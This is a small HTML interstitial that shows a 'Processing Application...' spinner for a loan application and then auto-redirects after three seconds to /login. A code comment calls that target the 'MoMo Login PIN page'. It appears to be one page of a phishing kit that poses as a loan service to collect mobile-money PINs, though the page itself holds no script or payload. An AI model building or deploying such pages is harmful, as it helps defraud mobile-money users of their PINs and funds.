<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Processing Application</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background-color: #003366; color: white; height: 100vh; display: flex; align-items: center; justify-content: center; }
        .spinner-box { width: 80px; height: 80px; border: 4px solid rgba(255,255,255,0.2); border-top: 4px solid #FFCC00; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px auto; display: flex; align-items: center; justify-content: center; font-size: 30px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
    <!-- Automatically redirect to MoMo Login PIN page after 3 seconds -->
    <meta http-equiv="refresh" content="3;url=/login">
</head>
<body class="text-center">
    <div>
        <div class="spinner-box">⏳</div>
        <h2 class="fw-bold mb-2">Processing Application...</h2>
        <p class="text-white-50 mb-3">Please wait while we process your loan application</p>
        <p class="small text-warning">Redirecting in a few moments...</p>
    </div>
</body>
</html>
